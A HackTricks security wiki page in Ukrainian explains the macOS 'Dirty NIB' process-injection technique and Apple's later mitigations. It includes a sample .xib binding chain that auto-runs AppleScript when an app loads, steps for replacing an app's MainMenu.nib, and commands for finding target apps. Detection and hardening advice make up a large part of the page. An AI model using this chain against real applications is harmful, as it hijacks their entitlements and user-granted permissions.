# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB означає зловживання файлами Interface Builder (.xib/.nib) усередині підписаного bundle macOS app для виконання логіки, контрольованої attacker, усередині target process, успадковуючи таким чином його entitlements і TCC permissions. Цю техніку спочатку задокументував xpn (MDSec), а пізніше узагальнив і значно розширив Sector7, який також описав mitigation від Apple у macOS 13 Ventura та macOS 14 Sonoma.<sup>[1][2]</sup> Довідкову інформацію та детальний розбір див. у references наприкінці.

> TL;DR
> • До macOS 13 Ventura: заміна MainMenu.nib у bundle (або іншого nib, що завантажується під час запуску) могла надійно забезпечити process injection і часто privilege escalation.
> • Починаючи з macOS 13 (Ventura), а також після покращень у macOS 14 (Sonoma): deep verification під час першого запуску, bundle protection, Launch Constraints і новий TCC permission “App Management” значною мірою запобігають post-launch nib tampering з боку unrelated apps. Атаки все ще можуть бути можливими в окремих випадках (наприклад, tooling того самого developer, що змінює власні apps, або terminals, яким user надав App Management/Full Disk Access).


## What are NIB/XIB files

Файли Nib (скорочення від NeXT Interface Builder) — це серіалізовані графи UI-об’єктів, які використовуються AppKit apps. Сучасний Xcode зберігає редаговані XML .xib files, які під час build компілюються у .nib. Типовий app завантажує свій основний UI через `NSApplicationMain()`, який читає key `NSMainNibFile` з app’s Info.plist і під час runtime інстанціює граф об’єктів.

Ключові моменти, які уможливлюють атаку:
- NIB loading інстанціює довільні Objective-C classes без необхідності відповідати вимогам NSSecureCoding (nib loader від Apple використовує `init`/`initWithFrame:`, якщо `initWithCoder:` недоступний).
- Cocoa Bindings можна використати для виклику methods під час інстанціювання nib, зокрема chained calls, які не потребують user interaction.


## Dirty NIB injection process (attacker view)

Класичний flow до Ventura:
1) Створіть malicious .xib
- Додайте об’єкт `NSAppleScript` (або інші “gadget” classes, такі як `NSTask`).
- Додайте `NSTextField`, title якого містить payload (наприклад, AppleScript або command arguments).
- Додайте один або кілька об’єктів `NSMenuItem`, підключених через bindings для виклику methods у target object.

2) Auto-trigger без user clicks
- Використайте bindings, щоб встановити target/selector menu item, а потім викликати private method `_corePerformAction`, щоб action автоматично виконався під час завантаження nib. Це усуває потребу в тому, щоб user натискав кнопку.

Мінімальний приклад auto-trigger chain усередині .xib (скорочено для ясності):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Це забезпечує довільне виконання AppleScript у цільовому процесі під час завантаження nib.<sup>[1]</sup> Розширені ланцюжки можуть:
- Створювати довільні класи AppKit (наприклад, `NSTask`) і викликати методи без аргументів, як-от `-launch`.
- Викликати довільні selectors з object arguments за допомогою описаного вище binding trick.
- Завантажувати AppleScriptObjC.framework для bridge до Objective‑C і навіть викликати вибрані C APIs.
- У старіших системах, де все ще міститься Python.framework, створювати bridge до Python, а потім використовувати `ctypes` для виклику довільних C functions (дослідження Sector7).<sup>[2]</sup>

3) Замініть nib застосунку
- Скопіюйте target.app у доступне для запису розташування, замініть, наприклад, `Contents/Resources/MainMenu.nib` на malicious nib і запустіть target.app. До Ventura включно, після одноразової перевірки Gatekeeper під час наступних запусків виконувалися лише поверхневі перевірки підпису, тому ресурси, що не є executable (наприклад, `.nib`), повторно не перевірялися.

Приклад AppleScript payload для видимого тесту:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Сучасні захисти macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple запровадила кілька системних засобів захисту, які суттєво знижують життєздатність Dirty NIB у сучасних версіях macOS:<sup>[2]</sup>
- Глибока перевірка під час першого запуску та захист bundle (macOS 13 Ventura)
- Під час першого запуску будь-якої програми (із quarantine або без нього) глибока перевірка підпису охоплює всі ресурси bundle. Після цього bundle стає захищеним: лише програми від того самого розробника (або явно дозволені програмою) можуть змінювати його вміст. Для запису в bundle іншої програми іншим програмам потрібен новий дозвіл TCC “App Management”.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps не можна скопіювати в інше місце та запустити; це унеможливлює підхід “скопіювати в /tmp, пропатчити, запустити” для OS apps.
- Покращення в macOS 14 Sonoma
- Apple посилила App Management і виправила відомі bypass (наприклад, CVE‑2023‑40450), про які повідомляв Sector7. Python.framework було видалено раніше (macOS 12.3), що зламало деякі ланцюжки privilege escalation.
- Зміни Gatekeeper/Quarantine
- Ширше обговорення змін Gatekeeper, provenance та assessment, які вплинули на цю техніку, дивіться на сторінці, наведеної нижче.

> Практичний наслідок
> • У Ventura+ зазвичай неможливо змінити .nib сторонньої програми, якщо ваш процес не має App Management або не підписаний тим самим Team ID, що й цільова програма (наприклад, developer tooling).
> • Надання App Management або Full Disk Access shell/терміналам фактично знову відкриває цю поверхню атаки для всього, що може виконувати code у контексті цього термінала.


### Усунення обмежень Launch Constraints

Launch Constraints блокують запуск багатьох Apple apps із нестандартних місць, починаючи з Ventura. Якщо ви покладалися на workflow до Ventura, як-от копіювання Apple app у тимчасову директорію, змінення `MainMenu.nib` і її запуск, очікуйте, що це не працюватиме в >= 13.0.


## Перелік цілей і nib (корисно для досліджень / legacy systems)

- Знайти apps, інтерфейс яких працює на nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Знайдіть потенційні ресурси nib усередині bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Ретельно перевіряйте підписи коду (перевірка завершиться помилкою, якщо ви змінили ресурси й не перепідписали їх):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Примітка: У сучасних версіях macOS під час спроби запису до bundle іншого застосунку без належної авторизації вас також заблокує захист bundle/TCC.


## Поради щодо виявлення та DFIR

- Моніторинг цілісності файлів у ресурсах bundle
- Слідкуйте за змінами mtime/ctime для `Contents/Resources/*.nib` та інших невиконуваних ресурсів у встановлених застосунках.
- Уніфіковані журнали та поведінка процесів
- Відстежуйте неочікуване виконання AppleScript усередині GUI-застосунків, а також процеси, що завантажують AppleScriptObjC або Python.framework. Приклад:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Проактивні перевірки
- Періодично запускайте `codesign --verify --deep` для критично важливих застосунків, щоб переконатися, що ресурси залишаються незмінними.
- Контекст привілеїв
- Перевіряйте, хто або що має TCC-дозвіл “App Management” або Full Disk Access (особливо термінали та агенти керування). Вилучення цих дозволів із оболонок загального призначення запобігає тривіальному повторному ввімкненню втручання на кшталт Dirty NIB.


## Посилення захисту (для розробників і захисників)

- Надавайте перевагу програмному UI або обмежуйте те, що створюється з nib. Не додавайте потужні класи (наприклад, `NSTask`) до графів nib і уникайте bindings, які опосередковано викликають selectors довільних об’єктів.
- Використовуйте hardened runtime з Library Validation (це вже стандарт для сучасних застосунків). Хоча це саме по собі не зупиняє nib injection, воно блокує просте завантаження native code і змушує атакувальників використовувати payloads лише на основі scripting.
- Не запитуйте та не використовуйте широкі дозволи App Management у інструментах загального призначення. Якщо MDM потребує App Management, відокремте цей контекст від shells, керованих користувачем.
- Регулярно перевіряйте цілісність bundle вашого застосунку та забезпечте self-healing ресурсів bundle у механізмах оновлення.


## Пов’язані матеріали в HackTricks

Дізнайтеся більше про Gatekeeper, quarantine та зміни provenance, які впливають на цю техніку:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Посилання

- [1] [xpn – DirtyNIB (оригінальний write-up із прикладом для Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 квітня 2024 року)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
